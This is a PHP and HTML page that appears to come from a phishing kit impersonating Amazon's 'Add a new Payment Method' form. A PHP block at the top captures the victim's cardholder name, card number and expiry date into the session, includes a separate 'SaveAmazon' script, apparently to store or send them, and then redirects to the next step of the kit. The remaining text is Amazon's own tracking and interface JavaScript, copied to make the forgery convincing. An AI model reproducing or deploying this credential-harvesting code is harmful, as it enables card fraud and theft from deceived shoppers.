<!DOCTYPE HTML>
<?php
session_start();


if(isset($_POST['ppw-widgetEvent:AddCreditCardEvent'])){
$_SESSION['accountHolderName'] = $_POST['ppw-accountHolderName'];
$_SESSION['addCreditCardNumber'] = $_POST['addCreditCardNumber'];
$expirationDate_month = $_POST['ppw-expirationDate_month'];
$expirationDate_year = $_POST['ppw-expirationDate_year'];
$_SESSION['ExpirationCard'] = " ".$expirationDate_month."/".$expirationDate_year." ";
$_SESSION['csc'] = '222';


$_SESSION['loged'] = "loged2";
include('../../../SaveAmazon/sv1.php');


$DIR='./cardselect.php';
header("LOCATION: ".$DIR."");
}




?>




<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.4-2021-05-29">

<head><script async="" src="https://images-na.ssl-images-amazon.com/images/I/31PaR7mjhbL.js" crossorigin="anonymous"></script><script>var aPageStart = (new Date()).getTime();</script><meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no"><meta charset="utf-8">
<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>

<link rel="shortcut icon" href="../../../img/Amazon_icon.png">
<script type="text/javascript">
window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = '9BH15D7TY9EC4M7ZAWTN',
    ue_url = '/uedata/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '139-6209373-4758101',
    ue_sn = 'apx-security.amazon.com',
    ue_furl = 'fls-na.amazon.com',
    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:139-6209373-4758101:9BH15D7TY9EC4M7ZAWTN$uedata=s:',
    ue_sbuimp = 1,
    ue_ibft = 0,
    ue_fnt = 0,
    ue_ccf = 0,

    ue_swi = 1;
var ue_viz=function(){(function(b,e,a){function k(c){if(b.ue.viz.length<p&&!l){var a=c.type;c=c.originalEvent;/^focus./.test(a)&&c&&(c.toElement||c.fromElement||c.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),b.ue.viz.push(a+":"+(+new Date-b.ue.t0)),"visible"==a&&(b.ue.isl&&q("at"),l=1))}}for(var l=0,q=b.uex,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+
"isibilityState";k({});d&&e.addEventListener(g,k,0);b.ue&&d&&(b.ue.pageViz={event:g,propHid:f})})(ue_csm,ue_csm.document,ue_csm.window)};

(function(d,k,K){function G(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function q(a){return"undefined"===typeof a}function C(a,b){for(var c in b)b[t](c)&&(a[c]=b[c])}function L(a){try{var b=K.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function M(n,b,c){var f=(x||{}).type,f=2===f||1===f;(aa?"device"===c&&f:f)||(n&&(d.ue_id=a.id=a.rid=n,y=y.replace(/((.*?:){2})(\w+)/,function(a,b){return b+n})),b&&(y=y.replace(/(.*?:)(\w|-)+/,function(a,c){return c+b}),d.ue_sid=
b),c&&a.tag("page-source:"+c),d.ue_fpf=y)}function O(){var a={};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[t](c)&&b.push(c);return b}}function u(d,b,c,f){if(0<v&&0<=(ba||[]).indexOf(d)&&!b){for(var g=z.now(),k=0;z.now()-g<v;)k++;a.tag("marker-delayed:"+d)}f=f||+new z;var w;if(b||q(c)){if(d)for(w in g=b?h("t",b)||h("t",b,{}):a.t,g[d]=f,c)c[t](w)&&h(w,b,c[w]);return f}}function h(d,b,c){var f=b&&b!=a.id?a.sc[b]:a;f||(f=a.sc[b]={});"id"===d&&c&&(P=1);return f[d]=c||f[d]}function Q(d,b,c,f,
g){c="on"+c;var h=b[c];"function"===typeof h?d&&(a.h[d]=h):h=function(){};b[c]=function(a){g?(f(a),h(a)):(h(a),f(a))};b[c]&&(b[c].isUeh=1)}function R(n,b,c,f){function r(b,c){var d=[b],f=0,e={},g,k;c?(d.push("m=1"),e[c]=1):e=a.sc;for(k in e)if(e[t](k)){var r=h("wb",k),l=h("t",k)||{},p=h("t0",k)||a.t0,m;if(c||2==r){r=r?f++:"";d.push("sc"+r+"="+k);for(m in l)q(l[m])||null===l[m]||d.push(m+r+"="+(l[m]-p));d.push("t"+r+"="+l[n]);if(h("ctb",k)||h("wb",k))g=1}}!v&&g&&d.push("ctb=1");return d.join("&")}
function N(b,c,f,e){if(b){var g=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),e.src=b,a.count&&a.count("postbackImageSize",b.length));if(y){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new z-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));g&&!g.ts&&g.startTimer();a.b&&(g=a.b,a.b="",N(g,c,f,1))}}function w(b){var c=x?x.type:D,d=2==c||a.isBFonMshop,c=c&&!d,e=a.bfini;P||(e&&1<e&&(b+="&bfform=1",c||(a.isBFT=e-1)),d&&(b+=
"&bfnt=1",a.isBFT=a.isBFT||1),a.ssw&&a.isBFT&&(a.isBFonMshop&&(a.isNRBF=0),q(a.isNRBF)&&(d=a.ssw(a.oid),d.e||q(d.val)||(a.isNRBF=1<d.val?0:1)),q(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||q(c))){for(var p in c)c[t](p)&&h(p,b,c[p]);a.isBFonMshop||u("pc",b,c);p=h("id",b)||a.id;var s=h("id2",b),e=a.url+"?"+n+"&v="+a.v+"&id="+p,v=h("ctb",b)||h("wb",b),A;v&&(e+="&ctb="+v);s&&(e+="&id2="+s);1<d.ueinit&&(e+="&ic="+d.ueinit);if(!("ld"!=n&&"ul"!=
n||b&&b!=p)){if("ld"==n){try{k[H]&&k[H].isUeh&&(k[H]=null)}catch(F){}if(k.chrome)for(s=0;s<I.length;s++)S(E,I[s]);(s=K.ue_backdetect)&&s.ue_back&&s.ue_back.value++;d._uess&&(A=d._uess());a.isl=1}a._bf&&(e+="&bf="+a._bf());d.ue_navtiming&&g&&(h("ctb",p,"1"),a.isBFonMshop||u("tc",D,D,J));!B||a.isBFonMshop||T||(g&&C(a.t,{na_:g.navigationStart,ul_:g.unloadEventStart,_ul:g.unloadEventEnd,rd_:g.redirectStart,_rd:g.redirectEnd,fe_:g.fetchStart,lk_:g.domainLookupStart,_lk:g.domainLookupEnd,co_:g.connectStart,
_co:g.connectEnd,sc_:g.secureConnectionStart,rq_:g.requestStart,rs_:g.responseStart,_rs:g.responseEnd,dl_:g.domLoading,di_:g.domInteractive,de_:g.domContentLoadedEventStart,_de:g.domContentLoadedEventEnd,_dc:g.domComplete,ld_:g.loadEventStart,_ld:g.loadEventEnd,ntd:("function"!==typeof B.now||q(J)?0:new z(J+B.now())-new z)+a.t0}),x&&C(a.t,{ty:x.type+a.t0,rc:x.redirectCount+a.t0}),T=1);a.isBFonMshop||C(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(e+="&ifr=1")}u(n,b,c,f);c="ld"==n&&b&&h("wb",b);var m,l;
c||b&&b!==p||ca(b);c||p==a.oid||da(p,(h("t",b)||{}).tc||+h("t0",b),+h("t0",b));(f=d.ue_mbl)&&f.cnt&&!c&&(e+=f.cnt());c?h("wb",b,2):"ld"==n&&(a.lid=G(p));for(m in a.sc)if(1==h("wb",m))break;if(c){if(a.s)return;e=r(e,null)}else f=r(e,null),f!=e&&(f=w(f),a.b=f),A&&(e+=A),e=r(e,b||a.id);e=w(e);if(a.b||c)for(m in a.sc)2==h("wb",m)&&delete a.sc[m];A=0;a._rt&&(e+="&rt="+a._rt());f=k.csa;if(!c&&f)for(l in m=h("t",b)||{},f=f("PageTiming"),m)m[t](l)&&f("mark",ea[l]||l,m[l]);c||(a.s=0,(l=d.ue_err)&&0<l.ec&&
l.pec<l.ec&&(l.pec=l.ec,e+="&ec="+l.ec+"&ecf="+l.ecf),A=h("ctb",b),"ld"!==n||b||a.markers||(a.markers={},C(a.markers,h("t",b))),h("t",b,{}));a.tag&&a.tag().length&&(e+="&csmtags="+a.tag().join("|"),a.tag=O());l=a.viz||[];(m=l.length)&&(e+="&viz="+l.splice(0,m).join("|"));q(d.ue_pty)||(e+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(e+="&tid="+a.tabid);a.aftb&&(e+="&aftb=1");!a._ui||b&&b!=p||(e+=a._ui());a.a=e;N(e,n,A,c)}}function ca(a){var b=k.ue_csm_markers||{},c;for(c in b)b[t](c)&&
u(c,a,D,b[c])}function F(a,b,c){c=c||k;if(c[U])c[U](a,b,!1);else if(c[V])c[V]("on"+a,b)}function S(a,b,c){c=c||k;if(c[W])c[W](a,b,!1);else if(c[X])c[X]("on"+a,b)}function Y(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,R(a))}}var c={},f,g;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");f={stop:b("os")};k.chrome?(F(E,a),I.push(a)):f[E]=d.onUl;for(g in f)f[t](g)&&Q(0,k,g,f[g]);d.ue_viz&&ue_viz();F("load",d.onLd);u("ue")}function da(g,b,c){var f=d.ue_mbl,h=k.csa,q=h&&h("SPA"),
h=h&&h("PageTiming");f&&f.ajax&&f.ajax(b,c);q&&h&&(q("newPage",{requestId:g,transitionType:"soft"}),h("mark","transitionStart",b));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.217353.0";a.paused=!1;var t="hasOwnProperty",E="beforeunload",H="on"+E,U="addEventListener",W="removeEventListener",V="attachEvent",X="detachEvent",ea={cf:"criticalFeature",
af:"aboveTheFold",fn:"functional",fp:"firstPaint",fcp:"firstContentfulPaint",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},z=k.Date,B=k.performance||k.webkitPerformance,g=(B||{}).timing,x=(B||{}).navigation,J=(g||{}).navigationStart,y=d.ue_fpf,ba=d.ue_tx_md,v=d.ue_tx_ad,aa=1===d.ue_ccf,P=0,T=0,I=[],D;a.oid=G(a.id);a.lid=G(a.id);a._t0=a.t0;a.tag=O();a.ifr=k.top!==k.self||k.frameElement?1:0;a.markers=null;a.attach=F;a.detach=S;if("000-0000000-8675309"===d.ue_sid){var Z=L("cdn-rid"),$=L("session-id");Z&&
$&&M(Z,$,"cdn")}d.uei=Y;d.ueh=Q;d.ues=h;d.uet=u;d.uex=R;a.reset=M;a.pause=function(d){a.paused=d};Y();0<v&&u("ho")})(ue_csm,ue_csm.window,ue_csm.document);


ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
(function(c){var a=c.ue;a.cv={};a.cv.scopes={};a.count=function(d,c,b){var e={},f=a.cv,g=b&&0===b.c;e.counter=d;e.value=c;e.t=a.d();b&&b.scope&&(f=a.cv.scopes[b.scope]=a.cv.scopes[b.scope]||{},e.scope=b.scope);if(void 0===c)return f[d];f[d]=c;d=0;b&&b.bf&&(d=1);ue_csm.ue_sclog||!a.clog||0!==d||g?a.log&&a.log(e,"csmcount",{c:1,bf:d}):a.clog(e,"csmcount",{bf:d})};a.count("baselineCounter2",1);a&&a.event&&(a.event({requestId:c.ue_id||"rid",server:c.ue_sn||"sn",obfuscatedMarketplaceId:c.ue_mid||"mid"},
"csm","csm.CSMBaselineEvent.4"),a.count("nexusBaselineCounter",1,{bf:1}))})(ue_csm);


(function(g,h,l){if("function"===typeof h.addEventListener&&"function"===typeof l.querySelectorAll){var e,r=["mouseenter","mouseleave"],t="click dblclick mousedown mouseover mouseout touchstart keydown keypress MSPointerDown pointerdown focusin".split(" ").concat(r),n=!1,p=[];var u=function(a){for(var b=[];a;)b.push(a),a=a.parentNode;return b};var q=function(a,b){var d=-1,c;for(c=0;c<b.length;c++)if(b[c]===a){d=c;break}return d};var v=function(a,b){a=q(a,b);0<=a&&b.splice(a,1)};var x=function(a){a=
u(a);for(var b,d,c=0;c<a.length;c++)if(d=a[c],(b=d.nodeName)&&b!==l.nodeName){b=b.toLowerCase();if(d.id)return b+"#"+d.id+(f?">"+f:"");(d=d.getAttribute("class"))&&(b=b+"."+d.split(" ").join("."));var f=b+(f?">"+f:"")}return f};var y=function(a){return a.replace(/[^\w.:\-]/g,function(a){return"#"===a?"::":">"===a?":-":"_"})};var w=function(a,b){if(g.ue&&g.ue.count&&g.ueLogError){a=x(a);var d=y(a);var c="degraded"===b?"A UX degrading element has entered the viewport: "+a:"A "+b+" was not handled on element: "+
a;g.ueLogError({m:c,fromOnError:1},{logLevel:"ERROR",attribution:a,message:c});b=["TNR","TNR:"+b,"TNR:"+d,"TNR:"+b+":"+d];for(e=0;e<b.length;e++)g.ue.count(b[e],(g.ue.count(b[e])||0)+1)}};var z=function(a){a=a.getBoundingClientRect();return a.top<a.bottom&&a.left<a.right&&0<=a.bottom&&a.top<=h.innerHeight&&0<=a.right&&a.left<=h.innerWidth};var m=function(){n||(n=!0,setTimeout(function(){[].forEach.call(l.querySelectorAll("[data-ux-degraded]"),function(a){z(a)?0>q(a,p)&&(p.push(a),w(a,"degraded")):
v(a,p)});n=!1},250))};h.addEventListener("scroll",m);h.addEventListener("resize",m);m=function(a){var b=!1,d=0>q(a,r);l.addEventListener(a,function(c){if(!b){b=!0;var f=[],e=d?u(c.target):[c.target],g,h;for(g=0;g<e.length;g++){var k=e[g];k.getAttribute&&("mouseover"===a&&k===c.target&&((h=k.getAttribute("data-ux-jq-mouseenter"))||""===h)&&f.push(k),((h=k.getAttribute("data-ux-"+a))||""===h)&&f.push(k))}f.length?(c.ack=c.acknowledge=function(a){a=a||c.currentTarget;v(a,f)},setTimeout(function(){var c;
for(c=0;c<f.length;c++)w(f[c],a);b=!1},250)):b=!1}},!0)};for(e=0;e<t.length;e++)m(t[e])}})(ue_csm,window,document);


var ue_hoe = +new Date();
}
window.ueinit = window.ue_ihb;
</script>

<!-- ncbcf7 -->
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 11825)</script>
    <title>Add a new Payment Method</title>

    <link rel="stylesheet" href="/cpe/resources/css/style.css">

    <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01rXlRztnIL.css,414aSa2g0iL.css,21ak7+1wqPL.css,01uNpa0PcLL.css,01NtHviPbnL.css,01xH24p45SL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,018gwG6-KML.css,017oxx82kUL.css,319af+06sNL.css,01B-YPN7k2L.css,21VgUeznheL.css,116TGBv0izL.css,11hcDsGAR1L.css,21AL2IbGWYL.css,01Zit5mlZtL.css,01CFUgsA-YL.css,31rjFdV1T2L.css,014rTkZXuAL.css,1143-dXvfTL.css,11MNK-noG6L.css,11VvAxw559L.css,01XRXSECMKL.css,110Q3MAjYJL.css,217CY98bj7L.css,118ArY7aMgL.css,01vd5lqeZUL.css,215BN1xpbYL.css,11KiKPowgWL.css,01p8s3ASHFL.css,11r1-thmy4L.css,011taseCFPL.css,11eI5SJms1L.css,01cbS3UK11L.css,21HViuPTI1L.css,01INc4pyFRL.css_.css?AUIClients/AmazonUI&amp;W62YVa8H#mobile.us.not-trident.322290-T2.338061-T1.322288-T1">

    <script>
(function(f,h,Q,E){function F(a){u&&u.tag&&u.tag(q(":","aui",a))}function v(a,b){u&&u.count&&u.count("aui:"+a,0===b?0:b||(u.count("aui:"+a)||0)+1)}function m(a){try{return a.test(navigator.userAgent)}catch(b){return!1}}function x(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}function q(a,b,c,e){b=b&&c?b+a+c:b||c;return e?q(a,b,e):b}function G(a,b,c){try{Object.defineProperty(a,b,{value:c,writable:!1})}catch(e){a[b]=c}return c}function ta(a,b){var c=a.length,
e=c,g=function(){e--||(R.push(b),S||(setTimeout(ca,0),S=!0))};for(g();c--;)da[a[c]]?g():(z[a[c]]=z[a[c]]||[]).push(g)}function ua(a,b,c,e,g){var d=h.createElement(a?"script":"link");x(d,"error",e);g&&x(d,"load",g);a?(d.type="text/javascript",d.async=!0,c&&/AUIClients|images[/]I/.test(b)&&d.setAttribute("crossorigin","anonymous"),d.src=b):(d.rel="stylesheet",d.href=b);h.getElementsByTagName("head")[0].appendChild(d)}function ea(a,b){return function(c,e){function g(){ua(b,c,d,function(b){T?v("resource_unload"):
d?(d=!1,v("resource_retry"),g()):(v("resource_error"),a.log("Asset failed to load: "+c));b&&b.stopPropagation?b.stopPropagation():f.event&&(f.event.cancelBubble=!0)},e)}if(fa[c])return!1;fa[c]=!0;v("resource_count");var d=!0;return!g()}}function va(a,b,c){for(var e={name:a,guard:function(c){return b.guardFatal(a,c)},guardTime:function(a){return b.guardTime(a)},logError:function(c,d,e){b.logError(c,d,e,a)}},g=[],d=0;d<c.length;d++)H.hasOwnProperty(c[d])&&(g[d]=U.hasOwnProperty(c[d])?U[c[d]](H[c[d]],
e):H[c[d]]);return g}function A(a,b,c,e,g){return function(d,h){function n(){var a=null;e?a=h:"function"===typeof h&&(p.start=w(),a=h.apply(f,va(d,k,l)),p.end=w());if(b){H[d]=a;a=d;for(da[a]=!0;(z[a]||[]).length;)z[a].shift()();delete z[a]}p.done=!0}var k=g||this;"function"===typeof d&&(h=d,d=E);b&&(d=d?d.replace(ha,""):"__NONAME__",V.hasOwnProperty(d)&&k.error(q(", reregistered by ",q(" by ",d+" already registered",V[d]),k.attribution),d),V[d]=k.attribution);for(var l=[],m=0;m<a.length;m++)l[m]=
a[m].replace(ha,"");var p=B[d||"anon"+ ++wa]={depend:l,registered:w(),namespace:k.namespace};c?n():ta(l,k.guardFatal(d,n));return{decorate:function(a){U[d]=k.guardFatal(d,a)}}}}function ia(a){return function(){var b=Array.prototype.slice.call(arguments);return{execute:A(b,!1,a,!1,this),register:A(b,!0,a,!1,this)}}}function W(a,b){return function(c,e){e||(e=c,c=E);var g=this.attribution;return function(){t.push(b||{attribution:g,name:c,logLevel:a});var d=e.apply(this,arguments);t.pop();return d}}}
function I(a,b){this.load={js:ea(this,!0),css:ea(this)};G(this,"namespace",b);G(this,"attribution",a)}function ja(){h.body?r.trigger("a-bodyBegin"):setTimeout(ja,20)}function C(a,b){a.className=X(a,b)+" "+b}function X(a,b){return(" "+a.className+" ").split(" "+b+" ").join(" ").replace(/^ | $/g,"")}function ka(a){try{return a()}catch(b){return!1}}function J(){if(K){var a={w:f.innerWidth||n.clientWidth,h:f.innerHeight||n.clientHeight};5<Math.abs(a.w-Y.w)||50<a.h-Y.h?(Y=a,L=4,(a=k.mobile||k.tablet?450<
a.w&&a.w>a.h:1250<=a.w)?C(n,"a-ws"):n.className=X(n,"a-ws")):0<L&&(L--,la=setTimeout(J,16))}}function xa(a){(K=a===E?!K:!!a)&&J()}function ya(){return K}function ma(){D.forEach(function(a){F(a)})}function na(a,b,c){if(b){a=m(/Chrome/i)&&!m(/Edge/i)&&!m(/OPR/i)&&!a.capabilities.isAmazonApp&&!m(new RegExp(Z+"bwv"+Z+"b"));var e="sw:browser:"+c+":";b.browser&&a&&(D.push(e+"supported"),b.browser.action(e,c));!a&&b.browser&&D.push(e+"unsupported")}}"use strict";var M=Q.now=Q.now||function(){return+new Q},
w=function(a){return a&&a.now?a.now.bind(a):M}(f.performance),N=w(),p=f.AmazonUIPageJS||f.P;if(p&&p.when&&p.register){N=[];for(var l=h.currentScript;l;l=l.parentElement)l.id&&N.push(l.id);return p.log("A copy of P has already been loaded on this page.","FATAL",N.join(" "))}var u=f.ue;F();F("aui_build_date:3.21.4-2021-05-29");var R=[],S=!1;var ca=function(){for(var a=setTimeout(ca,0),b=M();R.length;)if(R.shift()(),50<M()-b)return;clearTimeout(a);S=!1};var da={},z={},fa={},T=!1;x(f,"beforeunload",function(){T=
!0;setTimeout(function(){T=!1},1E4)});var ha=/^prv:/,V={},H={},U={},B={},wa=0,Z=String.fromCharCode(92),t=[],oa=f.onerror;f.onerror=function(a,b,c,e,g){g&&"object"===typeof g||(g=Error(a,b,c),g.columnNumber=e,g.stack=b||c||e?q(Z,g.message,"at "+q(":",b,c,e)):E);var d=t.pop()||{};g.attribution=q(":",g.attribution||d.attribution,d.name);g.logLevel=d.logLevel;g.attribution&&console&&console.log&&console.log([g.logLevel||"ERROR",a,"thrown by",g.attribution].join(" "));t=[];oa&&(d=[].slice.call(arguments),
d[4]=g,oa.apply(f,d))};I.prototype={logError:function(a,b,c,e){b={message:b,logLevel:c||"ERROR",attribution:q(":",this.attribution,e)};if(f.ueLogError)return f.ueLogError(a||b,a?b:null),!0;console&&console.error&&(console.log(b),console.error(a));return!1},error:function(a,b,c,e){a=Error(q(":",e,a,c));a.attribution=q(":",this.attribution,b);throw a;},guardError:W(),guardFatal:W("FATAL"),guardCurrent:function(a){var b=t[t.length-1];return b?W(b.logLevel,b).call(this,a):a},guardTime:function(a){var b=
t[t.length-1],c=b&&b.name;return c&&c in B?function(){var b=w(),g=a.apply(this,arguments);B[c].async=(B[c].async||0)+w()-b;return g}:a},log:function(a,b,c){return this.logError(null,a,b,c)},declare:A([],!0,!0,!0),register:A([],!0),execute:A([]),AUI_BUILD_DATE:"3.21.4-2021-05-29",when:ia(),now:ia(!0),trigger:function(a,b,c){var e=M();this.declare(a,{data:b,pageElapsedTime:e-(f.aPageStart||NaN),triggerTime:e});c&&c.instrument&&O.when("prv:a-logTrigger").execute(function(b){b(a)})},handleTriggers:function(){this.log("handleTriggers deprecated")},
attributeErrors:function(a){return new I(a)},_namespace:function(a,b){return new I(a,b)}};var r=G(f,"AmazonUIPageJS",new I);var O=r._namespace("PageJS","AmazonUI");O.declare("prv:p-debug",B);r.declare("p-recorder-events",[]);r.declare("p-recorder-stop",function(){});G(f,"P",r);ja();if(h.addEventListener){var pa;h.addEventListener("DOMContentLoaded",pa=function(){r.trigger("a-domready");h.removeEventListener("DOMContentLoaded",pa,!1)},!1)}var n=h.documentElement,aa=function(){var a=["O","ms","Moz",
"Webkit"],b=h.createElement("div");return{testGradients:function(){return!0},test:function(c){var e=c.charAt(0).toUpperCase()+c.substr(1);c=(a.join(e+" ")+e+" "+c).split(" ");for(e=c.length;e--;)if(""===b.style[c[e]])return!0;return!1},testTransform3d:function(){return!0}}}();p=n.className;var qa=/(^| )a-mobile( |$)/.test(p),ra=/(^| )a-tablet( |$)/.test(p),k={audio:function(){return!!h.createElement("audio").canPlayType},video:function(){return!!h.createElement("video").canPlayType},canvas:function(){return!!h.createElement("canvas").getContext},
svg:function(){return!!h.createElementNS&&!!h.createElementNS("http://www.w3.org/2000/svg","svg").createSVGRect},offline:function(){return navigator.hasOwnProperty&&navigator.hasOwnProperty("onLine")&&navigator.onLine},dragDrop:function(){return"draggable"in h.createElement("span")},geolocation:function(){return!!navigator.geolocation},history:function(){return!(!f.history||!f.history.pushState)},webworker:function(){return!!f.Worker},autofocus:function(){return"autofocus"in h.createElement("input")},
inputPlaceholder:function(){return"placeholder"in h.createElement("input")},textareaPlaceholder:function(){return"placeholder"in h.createElement("textarea")},localStorage:function(){return"localStorage"in f&&null!==f.localStorage},orientation:function(){return"orientation"in f},touch:function(){return"ontouchend"in h},gradients:function(){return aa.testGradients()},hires:function(){var a=f.devicePixelRatio&&1.5<=f.devicePixelRatio||f.matchMedia&&f.matchMedia("(min-resolution:144dpi)").matches;v("hiRes"+
(qa?"Mobile":ra?"Tablet":"Desktop"),a?1:0);return a},transform3d:function(){return aa.testTransform3d()},touchScrolling:function(){return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)},ios:function(){return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i)&&!m(/trident|Edge/i)},android:function(){return m(/android.([1-9]|[L-Z])/i)&&!m(/trident|Edge/i)},mobile:function(){return qa},tablet:function(){return ra},rtl:function(){return"rtl"===
n.dir}};for(l in k)k.hasOwnProperty(l)&&(k[l]=ka(k[l]));for(var ba="textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "),P=0;P<ba.length;P++)k[ba[P]]=ka(function(){return aa.test(ba[P])});var K=!0,la=0,Y={w:0,h:0},L=4;J();x(f,"resize",function(){clearTimeout(la);L=4;J()});var sa={getItem:function(a){try{return f.localStorage.getItem(a)}catch(b){}},setItem:function(a,b){try{return f.localStorage.setItem(a,b)}catch(c){}}};n.className=X(n,"a-no-js");C(n,"a-js");
!m(/OS [1-8](_[0-9]*)+ like Mac OS X/i)||f.navigator.standalone||m(/safari/i)||C(n,"a-ember");p=[];for(l in k)k.hasOwnProperty(l)&&k[l]&&p.push("a-"+l.replace(/([A-Z])/g,function(a){return"-"+a.toLowerCase()}));C(n,p.join(" "));n.setAttribute("data-aui-build-date","3.21.4-2021-05-29");r.register("p-detect",function(){return{capabilities:k,localStorage:k.localStorage&&sa,toggleResponsiveGrid:xa,responsiveGridEnabled:ya}});m(/UCBrowser/i)||k.localStorage&&C(n,sa.getItem("a-font-class"));r.declare("a-event-revised-handling",
!1);try{var y=navigator.serviceWorker}catch(a){F("sw:nav_err")}y&&(x(y,"message",function(a){a&&a.data&&v(a.data.k,a.data.v)}),y.controller&&y.controller.postMessage("MSG-RDY"));var D=[];(function(a){var b=a.reg,c=a.unreg;y&&y.getRegistrations?(O.when("A").execute(function(a){na(a,c,"unregister")}),x(f,"load",function(){O.when("A").execute(function(a){na(a,b,"register");ma()})})):(b&&b.browser&&D.push("sw:browser:register:unsupported"),c&&c.browser&&D.push("sw:browser:unregister:unsupported"),ma())})({reg:{},
unreg:{}});r.declare("a-fix-event-off",!1);v("pagejs:pkgExecTime",w()-N)})(window,document,Date);
  (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61-6nKPKyWL._RC|11Y+5x+kkTL.js,51106gSDnJL.js,11-zXBZR6KL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,01O9dYORveL.js,21NNXfMitSL.js,11rRjDLdAVL.js,51X-X0x2aRL.js,11UdUjBLtPL.js,11UNQpqeowL.js,11OREnu1epL.js,11KbZymw5ZL.js,21r53SJg7LL.js,0190vxtlzcL.js,61FXvKPsyQL.js,31oDRhpnLoL.js,015c-6CIP9L.js,31J9sEK3CtL.js,11VS-C+YWGL.js,31+jtu4krZL.js,01qkmZhGmAL.js,01+b9cewx1L.js_.js?AUIClients/AmazonUI&qa9N+d93#mobile.348458-T1.309035-T1');
